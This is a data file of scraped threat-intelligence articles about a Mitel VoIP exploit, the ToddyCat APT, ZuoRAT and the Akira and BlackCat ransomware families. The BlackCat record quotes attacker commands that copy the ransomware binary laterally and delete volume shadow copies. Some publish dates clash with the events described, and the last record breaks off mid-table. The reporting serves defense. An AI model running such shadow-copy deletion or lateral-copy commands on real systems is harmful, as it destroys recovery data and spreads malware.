{"id":180,"title":"Mitel VoIP Bug Exploited in Ransomware Attacks | Threatpost","publish_date":null,"link":"https://threatpost.com/mitel-voip-bug-exploited/180079/","clean_text":"Ransomware groups are abusing unpatched versions of a Linux-based Mitel VoIP (Voice over Internet Protocol) application and using it as a springboard plant malware on targeted systems.\nThe critical remote code execution (RCE) flaw, tracked as CVE-2022-29499, was first report by Crowdstrike in April as a zero-day vulnerability and is now patched.\nMitel is popularly known for providing business phone systems and unified communication as a service (UCaaS) to all forms of organizations.\nThe Mitel focuses on VoIP technology allowing users to make phone calls using an internet connection instead of regular telephone lines.\nAccording to Crowdstrike, the vulnerability affects the Mitel MiVoice appliances SA 100, SA 400 and Virtual SA.\nThe MiVoice provides a simple interface to bring all communications and tools together.\nBug Exploited to Plant Ransomware Researcher at Crowdstrike recently investigated a suspected ransomware attack.\nThe team of researchers handled the intrusion quickly, but believe the involvement of the vulnerability (CVE-2022-29499) in the ransomware strike.\nThe Crowdstrike identifies the origin of malicious activity linked to an IP address associated with a Linux-based Mitel VoIP appliance.\nFurther analysis led to the discovery of a novel remote code exploit. “\nThe device was taken offline and imaged for further analysis, leading to the discovery of a novel remote code execution exploit used by the threat actor to gain initial access to the environment,” Patrick Bennet wrote in a blog post.\nThe exploit involves two GET requests.\nThe first one targets a “get_url” parameter of a PHP file and the second one originates from the device itself. “\nThis first request was necessary because the actual vulnerable URL was restricted from receiving requests from external IP addresses,” the researcher explained.\nThe second request executes the command injection by performing an HTTP GET request to the attacker-controlled infrastructure and runs the stored command on the attacker’s server.\nAccording to the researchers, the adversary uses the flaw to create an SSL-enabled reverse shell via the “mkfifo” command and “openssl_client” to send outbound requests from the compromised network.\nThe “mkfifo” command is used to create a special file specified by the file parameter and can be opened by multiple processes for reading or writing purposes.\nOnce the reverse shell was established, the attacker created a web shell named “pdf_import.php”.\nThe original content of the web shell was not recovered but the researchers identifies a log file that includes a POST request to the same IP address that the exploit originated from.\nThe adversary also downloaded a tunneling tool called “Chisel” onto VoIP appliances to pivot further into the network without getting detected.\nThe Crowdstrike also identifies anti-forensic techniques performed by the threat actors to conceal the activity. “\nAlthough the threat actor deleted all files from the VoIP device’s filesystem, CrowdStrike was able to recover forensic data from the device.\nThis included the initial undocumented exploit used to compromise the device, the tools subsequently downloaded by the threat actor to the device, and even evidence of specific anti-forensic measures taken by the threat actor,” said Bennett.\nMitel released a security advisory on April 19, 2022, for MiVoice Connect versions 19.2 SP3 and earlier.\nWhile no official patch has been released yet.\nVulnerable Mitel Devices on Shodan The security researcher Kevin Beaumont shared a string “http.html_hash:-1971546278” to search for vulnerable Mitel devices on the Shodan search engine in a Twitter thread.\nAccording to Kevin, there are approximately 21,000 publicly accessible Mitel appliances worldwide, the majority of which are located in the United States, succeeded by the United Kingdom.\nMitel Mitigation Recommendations Crowdstrike recommends that organizations tighten defense mechanisms by performing threat modeling and identifying malicious activity.\nThe researcher also advised segregating the critical assets and perimeter devices to restrict the access control in case perimeter devices are compromised. “\nTimely patching is critical to protect perimeter devices.\nHowever, when threat actors exploit an undocumented vulnerability, timely patching becomes irrelevant,” Bennett explained.","num_sentences":31,"metadata":{"source":"blog","platform":"threatPost","filename":"mitel"}}
{"id":181,"title":"Elusive ToddyCat APT Targets Microsoft Exchange Servers | Threatpost","publish_date":"2020-12-28","link":"https://threatpost.com/elusive-toddycat-apt-targets-microsoft-exchange-servers/180031/","clean_text":"An advanced persistent threat (APT) group, dubbed ToddyCat, is believed behind a series of attacks targeting Microsoft Exchange servers of high-profile government and military installations in Asia and Europe.\nThe campaigns, according to researchers, began in December 2020, and have been largely poorly understood in their complexity until now. “\nThe first wave of attacks exclusively targeted Microsoft Exchange Servers, which were compromised with Samurai, a sophisticated passive backdoor that usually works on ports 80 and 443,” wrote Giampaolo Dedola security researcher at Kaspersky, in a report outlining the APT.\nResearchers said ToddyCat a is relatively new APT and there is “little information about this actor.”\nThe APT leverages two passive backdoors within the Exchange Server environment with malware called Samurai and Ninja, which researchers say are used by the adversaries to take complete control of the victim’s hardware and network.\nThe Samurai malware was a part of a multi-stage infection chain initiated by the infamous China Chopper and relies on web shells to drop exploits on the selected exchange server in Taiwan and Vietnam from December 2020, reports Kaspersky.\nThe researchers stated that the malware “arbitrary C# code execution and is used with multiple modules that allow the attacker to administrate the remote system and move laterally inside the targeted network.”\nIn some cases, they said, the Samurai backdoor lays the path to launch another malicious program called Ninja.\nAspects of ToddyCat’s threat activities were also tracked by cybersecurity firm ESET, which dubbed the “cluster of activities” seen in the wild as Websiic.\nMeanwhile, researchers at GTSC identified another part of the group’s infection vectors and techniques in a report outlining the delivery of the malware’s dropper code. “\nThat said, as far as we know, none of the public accounts described sightings of the full infection chain or later stages of the malware deployed as part of this group’s operation,” Kaspersky wrote.\nMultiple Strings of Attacks on Exchange Server Over the Years During the period between December 2020 and February 2021, the first wave of attacks were carried out against the limited number of servers in Taiwan and Vietnam.\nIn the next period, between February 2021 and May 2021, researchers observed a sudden surge in attacks.\nThat’s when, they said, the threat actor began abusing the ProxyLogon vulnerability to target organizations in multiple countries including Iran, India, Malaysia, Slovakia, Russia and the United Kingdom.\nAfter May 2021, the researchers observed the attributes linked to the same group which targets the previously mentioned countries as well as the military and government organizations based in Indonesia, Uzbekistan and Kyrgyzstan.\nThe attack surface in the third wave is expanded to desktop systems while previously the scope was limited to Microsoft Exchange Servers only.\nAttack Sequence The attack sequence is initiated after the deployment of the China Chopper web shell attack sequenc, which allows the dropper to execute and install the components and create multiple registry keys.\nThe registry modification in the prior step forces “svchost” to load a malicious library “iiswmi.dll” and performs its action to invoke the third stage where a “.Net loader” executes and opens the Samurai backdoor.\nAccording to the researchers, the Samurai backdoor is hard to detect during the reverse engineering process as it “switch cases to jump between instructions, thus flattening the control flow” and uses obfuscation techniques.\nIn the specific incidents, the advanced tool Ninja was implemented by Samurai to coordinate and collaborate multiple operators to work simultaneously on the same machine.\nThe researchers explained that the Ninja provides a large set of commands allowing an attacker to “control remote systems, avoid detection and penetrate deep inside a targeted network”.\nNinja shares similarities with the other post-exploitation toolkit like Cobalt strike in terms of capabilities and features.\nIt can “control the HTTP indicators and camouflage malicious traffic in HTTP requests that appear legitimate by modifying HTTP header and URL paths,” the researcher noted.\nToddyCat Activity Extend Over to Chinese APTs According to the report, China-based hackers are targeting victims of the ToddyCat APT gang within the same time frame.\nIn those instances, researchers observed the Chinese-language hackers use an Exchange backdoor called FunnyDream. “\nThis overlap caught our attention, since the ToddyCat malware cluster is rarely seen as per our telemetry; and we observed the same targets compromised by both APTs in three different countries.\nMoreover, in all the cases there was a proximity in the staging locations and in one case they used the same directory,” researchers wrote.\nThe security researchers believe that despite the ‘occasional proximity in staging locations’, they do not have any concrete proof that shows the linkage between the two malware families. “\nDespite the overlap, we do not feel confident merging ToddyCat with the FunnyDream cluster at the moment,” Kaspersky wrote. “\nConsidering the high-profile nature of all the victims we discovered, it is likely they were of interest to several APT groups,” the report added. “\nThe affected organizations, both governmental and military, show that this group is focused on very high-profile targets and is probably used to achieve critical goals, likely related to geopolitical interests,” Kaspersky wrote.","num_sentences":31,"metadata":{"source":"blog","platform":"threatPost","filename":"toddycat"}}
{"id":182,"title":"ZuoRAT Can Take Over Widely Used SOHO Routers | Threatpost","publish_date":"2020-04-28","link":"https://threatpost.com/zuorat-soho-routers/180113/","clean_text":"A novel multistage remote access trojan (RAT) that’s been active since April 2020 is exploiting known vulnerabilities to target popular SOHO routers from Cisco Systems, Netgear, Asus and others.\nThe malware, dubbed ZuoRAT, can access the local LAN, capture packets being transmitted on the device and stage man-in-the-middle attacks through DNS and HTTPS hijacking, according to researchers from Lumen Technologies’ threat-intelligence arm Black Lotus Labs.\nThe ability to not only hop on a LAN from a SOHO device and then stage further attacks suggests that the RAT may be the work of a state-sponsored actor, they noted in a blog post published Wednesday.\n“The use of these two techniques congruently demonstrated a high level of sophistication by a threat actor, indicating that this campaign was possibly performed by a state-sponsored organization,” researchers wrote in the post.\nThe level of evasion that threat actors use to cover up communication with command-and-control (C&C) in the attacks “cannot be overstated” and also points to ZuoRAT being the work of professionals, they said. “\nFirst, to avoid suspicion, they handed off the initial exploit from a dedicated virtual private server (VPS) that hosted benign content,” researchers wrote. “\nNext, they leveraged routers as proxy C2s that hid in plain sight through router-to-router communication to further avoid detection.\nAnd finally, they rotated proxy routers periodically to avoid detection.”\nPandemic Opportunity Researchers named the trojan after the the Chinese word for “left” because of the file name used by the threat actors, “asdf.a.”\nThe name “suggests keyboard walking of the lefthand home keys,” researchers wrote.\nThreat actors deployed the RAT likely to take advantage of often unpatched SOHO devices shortly after the COVID-19 pandemic broke out and many workers were ordered to work from home, which opened up a host of security threats, they said. “\nThe rapid shift to remote work in spring of 2020 presented a fresh opportunity for threat actors to subvert traditional defense-in-depth protections by targeting the weakest points of the new network perimeter — devices which are routinely purchased by consumers but rarely monitored or patched,” researchers wrote. “\nActors can leverage SOHO router access to maintain a low-detection presence on the target network and exploit sensitive information transiting the LAN.”\nMulti-Stage Attack From what researchers observed, ZuoRAT is a multi-stage affair, with the first stage of core functionality designed to glean information about the device and the LAN to which its connected, enable packet capture of network traffic, and then send the info back to command-and-control (C&C). “\nWe assess the purpose of this component was to acclimate the threat actor to the targeted router and the adjacent LAN to determine whether to maintain access,” researchers noted.\nThis stage has functionality to ensure only a single instance of the agent was present, and to perform a core dump that could yield data stored in memory such as credentials, routing tables and IP tables, as well as other info, they said.\nZuoRAT also includes a second component comprised of auxiliary commands sent to the router for use as the actor so chooses by leveraging additional modules that can be downloaded onto the infected device. “\nWe observed approximately 2,500 embedded functions, which included modules ranging from password spraying to USB enumeration and code injection,” researchers wrote.\nThis component provides capability for LAN enumeration capability, which allows the threat actor to further scope out the LAN environment and also perform DNS and HTTP hijacking, which can be difficult to detect, they said.\nOngoing Threat Black Lotus analyzed samples from VirusTotal and its own telemetry to conclude that about 80 targets so far have been compromised by ZuoRAT.\nKnown vulnerabilities exploited to access routers to spread the RAT include: CVE-2020-26878 and CVE-2020-26879.\nSpecifically, threat actors used a Python-compiled Windows portable executable (PE) file that referenced a proof of concept called ruckus151021.py to gain credentials and load ZuoRAT, they said.\nDue to the capabilities and behavior demonstrated by ZuoRAT, it’s highly likely that not only that the threat actor behind ZuoRAT is still actively targeting devices, but has been ” living undetected on the edge of targeted networks for years,” researchers said.\nThis presents an extremely dangerous scenario for corporate networks and other organizations with remote workers connecting to affected devices, noted one security professional. “\nSOHO firmware typically isn’t built with security in mind, especially pre-pandemic firmware where SOHO routers weren’t a big attack vector,” observed Dahvid Schloss, offensive security team lead for cybersecurity firm Echelon, in an email to Threatpost.\nOnce a vulnerable device is compromised, threat actors then have free rein “to poke and prod at whatever device is connected” to the trusted connection that they hijack, he said. “\nFrom there you could attempt to use proxychains to throw exploits into the network or just monitor all the traffic going in, out, and around the network,” Schloss said.","num_sentences":27,"metadata":{"source":"blog","platform":"threatPost","filename":"zuorat"}}
{"id":183,"title":"Ransomware Spotlight: Akira | Trend Micro (US)","publish_date":"2023-03-28","link":"https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-akira","clean_text":"Ransomware Spotlight: Akira Top affected industries and countries Because Akira is new and highly targeted, the number of attacks is not as substantial as other more established and widely used ransomware families.\nOur Trend Micro™ Smart Protection Network™ telemetry points to France as having been most hit by Akira from May 1, 2023, to Aug. 31, 2023, with 53.1% of all detections.\nThe United States and Turkey take the second and third spots, respectively, with 107 and 22 detections.\nBased on our data, most of Akira’s victims belong to unspecified industries.\nBased on reports, approximately 80% of Akira’s victims are small to medium-sized businesses (SMBs).\nThe materials, manufacturing, and financial sectors made the top five list in the three-month span.\nAkira’s monthly detections showed a surge in June 2023 with 508 attack attempts, which is significantly higher than the other months in our analysis period.\nOur lowest detections were for May 2023, with only three attack attempts for the entire month.\nTargeted regions and industries according to Akira's ransomware leak site We now focus on Akira ransomware operators’ leak site data, which provides details on organizations that have been targeted by Akira actors.\nThis data, which is a consolidation of Trend Micro’s open-source intelligence (OSINT) research and investigation of the leak site, shows that Akira ransomware actors compromised 107 organizations between April 1 to August 31, 2023.\nMost of Akira victims — specifically, 85.9% of them — were businesses based in North America.\nFigure 4.\nThe distribution by region of Akira ransomware’s victim organizations Sources: Akira ransomware’s leak site and Trend Micro’s OSINT research (April 2023 – August 2023) We’ve found that most of Akira’s victims were small-sized businesses, with 1 to 200 employees, at 59 victims.\nMeanwhile, midsized businesses and large enterprises took the second and third slots, respectively.\nInterestingly, based on leak site data, the most targeted sectors are the academe and professional services, followed closely by construction and materials.\nFigure 6.\nThe distribution by organization size of Akira ransomware’s victim organizations Sources: Akira ransomware’s leak site and Trend Micro’s OSINT research (April 2023 – August 2023) Infection chain and techniques The Akira ransomware typically gains access to victim environments by using valid credentials that were possibly obtained from their affiliates or other attacks.\nIt has been observed using third-party tools such as PCHunter, AdFind, PowerTool, Terminator, Advanced IP Scanner, Windows Remote Desktop Protocol (RDP), AnyDesk, Radmin, WinRAR, and Cloudflare’s tunneling tool.\nFigure 8 shows Akira’s infection chain.\nFigure 8.\nThe typical Akira ransomware infection chain Figure 9.\nThe Akira ransomware infection chain based on an infection case we’ve analyzed Initial Access Akira ransomware actors are known to use compromised VPN credentials to gain initial access.\nThey’ve also been observed targeting vulnerable Cisco VPNs by exploiting CVE-2023-20269, a zero-day vulnerability that affects Cisco ASA and FTD.\nPersistence Akira operators have been observed creating a new domain account on the compromised system to establish persistence.\nDefense evasion For its defense evasion, Akira ransomware actors have been observed using PowerTool or a KillAV tool that abuses the Zemana AntiMalware driver to terminate AV-related processes.\nDiscovery The actors behind the Akira ransomware have been observed using the following to gain knowledge on the victim's system and its connected network: - PCHunter and SharpHound to gather system information - AdFind alongside the net Windows command and nltest to obtain domain information - Advanced IP Scanner and MASSCAN to discover other remote systems Credential Access Akira ransomware operators use Mimikatz, LaZagne, or a specific command line to gather credentials.\nLateral Movement Akira actors use Windows RDP to move laterally within the victim's network.\nCommand and control Akira ransomware operators have been observed using the third-party tool and web service RClone to exfiltrate stolen information.\nMoreover, they have also been observed using either FileZilla or WinSCP to exfiltrate stolen information via File Transfer Protocol (FTP). -\nAnyDesk - Radmin - Cloudflare Tunnel - MobaXterm - RustDesk - Ngrok Exfiltration Akira ransomware operators have been observed using the third-party tool and web service RClone to exfiltrate stolen information.\nMoreover, they have also been observed using either FileZilla or WinSCP to exfiltrate stolen information via File Transfer Protocol (FTP).\nImpact Akira ransomware encrypts targeted systems using a hybrid encryption algorithm that combines Chacha20 and RSA.\nAdditionally, the Akira ransomware binary, like most modern ransomware binaries, has a feature that allows it to inhibit system recovery by deleting shadow copies from the affected system.\nOther technical details - It avoids encrypting the following directories: - winnt - tmp - temp - thumb - $Recycle.\nBin - $RECYCLE.BIN - System Volume Information - Boot - Windows - Trend Micro - ProgramData - It avoids encrypting files with the following extensions: - .exe - .dll - .lnk - .sys - .msi - .akira - It encrypts the whole file, regardless of size, if the file extension is any of the following: - .4dd - .4dl - .accdb - .accdc - .accde - .accdr - .accdt - .accft - .adb - .ade - .adf - .adp - .arc - .ora - .alf - .ask - .btr - .bdf - .cat - .cdb - .ckp - .cma - .cpd - .dacpac - .dad - .dadiagrams - .daschema - .db - .db-shm - .db-wal - .db3 - .dbc - .dbf - .dbs - .dbt - .dbv - .dbx - .dcb - .dct - .dcx - ddl - .dlis - .dp1 - .dqy - .dsk - .dsn - .dtsx - .dxl - .eco - .ecx - .edb - .epim - .exb - .fcd - .fdb - .fic - .fmp - .fmp12 - .fmpsl - .fol - .fol - .fp4 - .fp5 - .fp7 - .fpt - .frm - .gdb - .grdb - .gwi - .hdb - .his - .ib - .idb - .ihx - .itdb - .itw - .jet - .jtx - .kdb - .kexi - .kexic - .kexis - .lgc - .lwx - .maf - .maq - .mar - .mas - .mav - .mdb - .mdf - .mpd - .mrg - .mud - .mwb - .myd - .ndf - .nnt - .nrmlib - .ns2 - .ns3 - .ns4 - .nsf - .nv - .nv2 - .nwdb - .nyf - .odb - .oqy - .orx - .owc - .p96 - .p97 - .pan - .pdb - .pdm - .pnz - .qry - .qvd - .rbf - .rctd - .rod - .rodx - .rpd - .rsd - .sas7bdat - .sbf - .scx - .sdb - .sdc - .sdf - .sis - .spq - .sql - .sqlite - .sqlite3 - .sqlitedb - .te - .temx - .tmd - .tps - .trc - .trm - .udb - .udl - .usr - .v12 - .vis - .vpd - .vvv - .wdb - .wmdb - .wrk - .xdb - .xld - .xmlff - .abcddb - .abs - .abx - .accdw - .adn - .db2 - .fm5 - .hjt - .icg - .icr - kdb - .lut - .maw - .mdn - .mdt - It avoids encrypting files with the following extensions: - .PLAY - .exe - .msi - .dll - .lnk - .sys - It drops a ransom note: akira_readme.txt - It encrypts files using Chacha20 and encrypts the key using RSA encryption. -\nKey generation: - A ChaCha20 key and nonce are generated using CryptGenRandom - Key encryption: - It uses the embedded RSA public key to encrypt the generated Chacha20 key - File encryption - Files are encrypted using ChaCha20 encryption. -\nThe Akira ransomware supports three encryption modes depending on the file type and size: - Full encryption - Partial encryption - Spot encryption - Key generation: - It appends this extension to encrypted files: - .akira - Hacktools - PowerTool - ADFind MITRE tactics and techniques | Initial Access | Persistence | Execution | Defense Evasion | Credential Access | Discovery | Command and Control | Lateral Movement | Exfiltration | Impact | |---|---|---|---|---|---|---|---|---|---| T1078 - Valid Accounts T1190 - Exploit Public-Facing Application | T1136.002 - Create Account: Domain Account | T1059 - Command and Scripting Interpreters | T1562.001 - Impair Defenses: Disable or Modify Tools | T1003.001 - OS Credential Dumping: LSASS Memory | T1082 - System Information Discovery T1069.002 - Permission Groups Discovery: Domain Groups T1018 - Remote System Discovery | T1219 - Remote Access Software | T1570 - Lateral Tool Transfer | T1567.002 - Exfiltration Over Web Service: Exfiltration to Cloud Storage T1048.003 - Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol | T1490 - Inhibit System Recovery T1486 - Data Encrypted for Impact | Summary of malware, tools, and exploits used | Initial Access | Defense Evasion | Discovery | Credential Access | Command and Control | Lateral Movement | Exfiltration | |---|---|---|---|---|---|---| | | | | | | | | | | | | | | | | | | ||| | | ||||| | | ||||| | Security recommendations As experienced ransomware actors develop increasingly sophisticated ransomware families, organizations need to proactively protect themselves from evolving threats.\nAs ransomware threats evolve and exploit vulnerabilities to target businesses around the world, organizations need to improve their security posture to avoid financial and reputational harm.\nHere are some security best practices that can help organizations protect their mission-critical data from ransomware attacks: Audit and inventory - Take an inventory of assets and data. -\nIdentify authorized and unauthorized devices and software. -\nMake an audit of event and incident logs.\nConfigure and monitor - Manage hardware and software configurations. -\nGrant admin privileges and access only when necessary to an employee’s role. -\nMonitor network ports, protocols, and services. -\nActivate security configurations on network infrastructure devices such as firewalls and routers. -\nEstablish a software allowlist that executes only legitimate applications.\nPatch and update - Conduct regular vulnerability assessments. -\nPerform patching or virtual patching for operating systems and applications. -\nUpdate software and applications to their latest versions.\nProtect and recover - Implement data protection, backup, and recovery measures. -\nEnable multifactor authentication (MFA).\nSecure and defend - Employ sandbox analysis to block malicious emails. -\nDeploy the latest versions of security solutions to all layers of the system, including email, endpoint, web, and network. -\nDetect early signs of an attack such as the presence of suspicious tools in the system. -\nUse advanced detection technologies such as those powered by artificial intelligence (AI) and machine learning.\nTrain and test - Regularly train and assess employees in security skills. -\nConduct red-team exercises and penetration tests.\nA multilayered approach can help organizations guard possible entry points into the system (endpoint, email, web, and network).\nSecurity solutions that can detect malicious components and suspicious behavior can also help protect enterprises. -\nTrend Micro Vision One™ provides multilayered protection and behavior detection, which helps block questionable behavior and tools early on before the ransomware can do irreversible damage to the system. -\nTrend Micro Cloud One™ Workload Security protects systems against both known and unknown threats that exploit vulnerabilities.\nThis protection is made possible through techniques such as virtual patching and machine learning. -\nTrend Micro™ Deep Discovery™ Email Inspector employs custom sandboxing and advanced analysis techniques to effectively block malicious emails, including phishing emails that can serve as entry points for ransomware. -\nTrend Micro Apex One™ offers next-level automated threat detection and response against advanced concerns such as fileless threats and ransomware, ensuring the protection of endpoints.\nIndicators of compromise (IOCs) The IOCs for this article can be found here.\nActual indicators might vary per attack.\nTrend Micro Vision One Hunting Query Trend Vision One customers can use the following hunting query to check if their network/system is possibly affected by Akira ransomware: fullPath:(*.akira* OR *akira_readme.txt*) Like it?\nAdd this infographic to your site: 1.\nClick on the box below.\n2.\nPress Ctrl+A to select all.\n3.\nPress Ctrl+C to copy.\n4.\nPaste the code into your page (Ctrl+V).\nImage will appear the same size as you see above.\nRecent Posts - Deepfake It ‘til You Make It: A Comprehensive View of the New AI Criminal Toolset - Proactive Security: The Role of Exposure Management and Detection-Response Capability - The Trend Micro Underground Series - The Road to Agentic AI: Defining a New Paradigm for Technology and Cybersecurity - Stay Ahead of AI Threats: Secure LLM Applications with Trend Vision One","num_sentences":77,"metadata":{"source":"blog","platform":"trendmicro","filename":"Akira"}}
{"id":184,"title":"Ransomware Spotlight: BlackCat | Trend Micro (US)","publish_date":"2021-11-28","link":"https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-blackcat","clean_text":"Ransomware Spotlight: BlackCat Top affected countries and industries according to Trend Micro data This section cites Trend Micro™ Smart Protection Network™ (SPN) data on BlackCat’s attempts to compromise organizations.\nNote that these detections pertain only to Trend Micro customers and consist of only a fraction of the victims found in BlackCat’s leak site.\nOur detections show that organizations in the US received the greatest number of BlackCat ransomware attacks, comprising 39.3% of the total.\nAustralia ranks far second, while the rest are dispersed across Europe and Asia-Pacific.\nFigure 1.\n10 countries with the highest number of attack attempts in terms of infected machines for the BlackCat ransomware (November 1, 2021 to September 30, 2022) Source: Trend Micro™ Smart Protection Network™ ™ The highest number of detections came from the manufacturing industry, with 176, or a quarter of the total.\nFigure 2.\n10 industries with the highest number of attack attempts in terms of infected machines for the BlackCat ransomware (November 1, 2021 to September 30, 2022) Source: Trend Micro™ Smart Protection Network™ Targeted regions and industries according to BlackCat’s leak site This section provides information on the attacks recorded on the BlackCat group’s leak site which represents successfully compromised organizations that have declined to pay ransom as of this writing.\nTrend Micro’s open-source intelligence (OSINT) research and its investigation of the site show that from December 1, 2021 to September 30, 2022, the group compromised a total of 173 organizations.\nFigure 3.\nThe distribution by region of BlackCat’s victim organizations from December 1, 2021 to September 30, 2022 Sources: BlackCat’s leak site and Trend Micro’s OSINT research Trend Micro’s product feedback on the top affected countries (shown on Figure 1) was consistent with data found in BlackCat’s leak site, which revealed that the group favored enterprises based in the US, with a victim count of 81 or 58.7% of the total.\nAlso, organizations based in Europe and Asia- Pacific were among the most targeted by the group.\nFigure 4.\nThe distribution by country of BlackCat’s victim organizations from December 1, 2021 to September 30, 2022 Sources: BlackCat’s leak site and Trend Micro’s OSINT research BlackCat’s leak site data suggests that in terms of industry, finance and professional services were the most hit, followed by legal services.\nTechnology, energy and utilities, construction, materials, and manufacturing were also largely affected.\nFigure 5.\nThe distribution by industry of BlackCat’s victim organizations from December 1, 2021 to September 30, 2022 Source: Sources: BlackCat’s leak site and Trend Micro’s OSINT research Small-size businesses make up 52% of BlackCat’s victims, followed by midsize businesses at 26%.\nCombined, they constitute more than three quarters of the gang’s preferred targets.\nThis trend is expected to persist in the months to come.\nFigure 6.\nThe distribution by organization size of BlackCat’s victim organizations from December 1, 2021 to September 30, 2022 Source: Sources: BlackCat’s leak site and Trend Micro’s OSINT research Infection chain and techniques Initial Access - Trend Micro detected the arrival of BlackCat ransomware through MS Exchange Server vulnerabilities, listed as CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065.\nThe malware authors keep their access using remote code execution (RCE) via ConnectWise, a software solution designed for managed service providers (MSPs).\nThis allows them to query credentials without passwords or other essential account information. -\nWe also found evidence of a possible initial entry of the threat actor that is related to exploiting SSH keys to establish foothold on the target’s machine. -\nIt should be noted that we cannot rule out other methods of initial access.\nExecution - Despite finding no evidence of the ransomware binary being executed on the machine, we observed that the encryption of files was carried out with ntoskrnl.exe as the parent process.\nThis led us to believe that Cobeacon served as the conduit for the ransomware's execution by injecting the process into a Windows component (ntoskrnl.exe) to evade detection and ensure successful encryption of the victim's files.\nDefense evasion, discovery, and credential access - Upon gaining access to the network, the malicious actors impair the defenses of the target organization by uninstalling antivirus applications, using AdFind and ADRecon to get hold of the victims’ domain accounts, and SoftPerfect to find information about the victims’ network.\nBlackCat operators also leverage Process Hacker and Mimikatz to access and dump the victims’ credentials. -\nTo facilitate reconnaissance, privilege escalation, and lateral movement on the victim's network, threat actors also utilized WMIC and Netstat to extract information on user accounts and their associated Security Identifiers (SIDs).\nAdditionally, the threat actors employed Task Manager to extract LSASS credentials.\nLateral Movement - The BlackCat ransomware binary can propagate and execute laterally on its own by using an embedded PsExec module.\nTrend Micro has observed BlackCat operators accessing other endpoints in the victims' network for lateral movement using remote control applications like RDP and MobaXterm. -\nThreat actors were also observed using BITSAdmin to copy what we believe is the ransomware binary onto other machines within the victim's network, using the following command: /transfer zzz \\\\ {redacted}\\share$\\zzz.exe %AppData%\\zzz.exe.\nOther files with the following filenames are also copied using the same command: xxx.exe, yyy.exe, and sv.exe.\nCommand and Control - A Base64-encoded PowerShell script with an embedded Cobalt Strike SMB beacon is used to inject the shellcode into memory and establish connection with the C&C via the following named pipes – \\\\ .\\pipe\\npfs_78, \\\\ .\\pipe\\fullduplex_9c.\nExfiltration - Malicious actors also used ExMatter to steal information for double extortion, aside from their use of 7-Zip, Rclone,MEGASync, or WinSCP to archive stolen information, which they send to their C&C server.\nTrend Micro reports that threat researchers noted BlackCat’s use of an upgraded version of ExMatter published in September 2022. -\nWe also observed traces of FreeFileSync, a file synchronization and backup tool.\nWe believe threat actors used this tool to exfiltrate valuable information from the victim’s machines weeks before the actual execution of the ransomware binary.\nImpact - The malicious actors’ use of Rust to deliver the ransomware payload sets the stage for its encryption routine .\nThe ransomware binary defaces the system’s background image and replaces it with one containing a notification that important files had been downloaded and encrypted, plus information on where additional instructions can be found (see Figure 10). -\nThe payload also terminates specific services related to backups, antivirus applications, database, Windows internet services, and ESXi virtual machines (VMs). -\nTrend Micro researchers also found another variant of BlackCat ransomware binary that restarts the affected system to safe mode before proceeding to its encryption routine.\nIt also disables system recovery and deletes volume shadow copies to inhibit the recovery of the affected systems. -\nFor the Sphynx variant, the string appended for encrypted files is based on the ransomware binary's configuration so it should vary for each sample.\nThe ransomware drops its ransom note in an archive format with randomized characters. -\nBased on additional analysis, the Sphynx variant also inhibits system recovery by deleting volume shadow copies using the commands: vssadmin.exe Delete Shadows /all /quiet and wmic.exe Shadowcopy Delete Other technical details BlackCat avoids the following directories: - system volume information - intel - $windows.~ws - application data - $recycle.bin - mozilla - $windows.~bt - public - msocache - windows - default - all users - tor browser - programdata - boot - config.msi - perflogs - appdata - windows.old It avoids encrypting the following files with strings in their file name: - desktop.ini - autorun.inf - ntldr - bootsect.bak - thumbs.db - boot.ini - ntuser.dat - iconcache.db - bootfont.bin - ntuser.ini - ntuser.dat.log It also prevents the encryption of files with the following extensions: - themepack - nls - diagpkg - msi - lnk - exe - cab - scr - bat - drv - rtp - msp - prf - msc - ico - key - ocx - diagcab - diagcfg - pdb - wpx - hlp - icns - rom - dll - msstyles - mod - ps1 - ics - hta - bin - cmd - ani - 386 - lock - cur - idx - sys - com - deskthemepack - shs - ldf - theme - mpa - nomedia - spl - cpl - adv - icl - msu BlackCat terminates the following processes and services: Processes: - agntsvc - dbeng50 - dbsnmp - encsvc - excel - firefox - infopath - isqlplussvc - msaccess - mspub - mydesktopq - mydesktopservic - notepad - ocautoupds - ocomm - ocssd - onenote - oracle - outlook - powerpnt - sqbcoreservic - sql - steam - synctime - tbirdconfig - thebat - thunderbird - visio - winword - wordpad - xfssvccon - *sql* - bedbh - vxmon - benetns - bengien - pvlsvr - beserver - raw_agent_svc - vsnapvss - CagService - QBIDPService - QBDBMgrN - QBCFMonitorSe - SAP - TeamViewer_Service - TeamViewer - tv_w32 - tv_x64 - CVMountd - cvd - cvfwd - CVODS - saphostexe - saposcol - sapstartsrv - avagent - avscc - DellSystem - EnterpriseClient - VeeamNFSSvc - VeeamTransportSvc - VeeamDeploymentSvc Services: - mepocs - memtas - veeam - svc$ - backup - sql - vss - msexchange - sql$ - mysql - mysql$ - sophos - MSExchange - MSExchange$ - WSBExchange - PDVFSService - BackupExecVSSProvider - BackupExecAgentAccelerator - BackupExecAgentBrowser - BackupExecDiveciMediaService - BackupExecJobEngine - BackupExecManagementService - BackupExecRPCService - GxBlr - GxVss - GxClMgrS - GxCVD - GxCIMgr - GXMMM - GxVssHWProv - GxFWD - SAPService - SAP - SAP$ - SAPD$ - SAPHostControl - SAPHostExec - QBCFMonitorService - QBDBMgrN - QBIDPService - AcronisAgent - VeeamNFSSvc - VeeamDeploymentService - VeeamTransportSvc - MVArmor - MVarmor64 - VSNAPVSS - AcrSch2Svc MITRE tactics and techniques | Initial Access | Execution | Defense Evasion | Credential Access | Discovery | Lateral Movement | Exfiltration | Impact | |---|---|---|---|---|---|---|---| T1078 - Valid Accounts T1190 - Exploit Public-Facing Application | T1059 - Command and Scripting Interpreter | T1562.001 - Impair Defenses: Disable or Modify Tools T1562.009 - Impair Defenses: Safe Mode Boot T1070.001 - Indicator Removal on Host: Clear Windows Event Logs | T1003.001 - OS Credential Dumping: LSASS Memory | T1087 - Account Discovery T1083 - File and Directory Discovery T1057 - Process Discovery T1135 - Network Share Discovery T1016 - System Network Configuration Discovery T1069 - Permission Groups Discovery T1018 - Remote System Discovery | T1021.002 - Remote Services: SMB/Windows Admin Shares | T1048 - Exfiltration Over Alternative Protocol T1567 - Exfiltration Over Web Service | T1489 - Service stop T1490 - Inhibit System Recovery T1486 - Data Encrypted for Impact T1491.001 - Defacement: Internal Defacement | Summary of malware, tools, and exploits used 